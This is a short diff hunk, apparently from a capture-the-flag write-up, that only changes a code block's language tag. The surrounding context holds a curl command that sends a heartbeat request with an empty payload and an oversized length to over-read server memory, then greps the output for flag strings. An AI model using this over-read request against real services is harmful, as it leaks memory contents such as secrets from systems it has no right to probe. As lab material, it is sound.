@@ -47,7 +47,7 @@ Notes:
 - Any `length > 512 + len(payload)` works (e.g., 1024, 2048, 4096, 8192).
 - Filter output for keywords like `GCTF`, `flag`, `ctf`.
 
-```bat
+```bash
 curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d '{"payload":"","length":8192}' | grep -iE "flag|ctf|gctf"
 ```
 
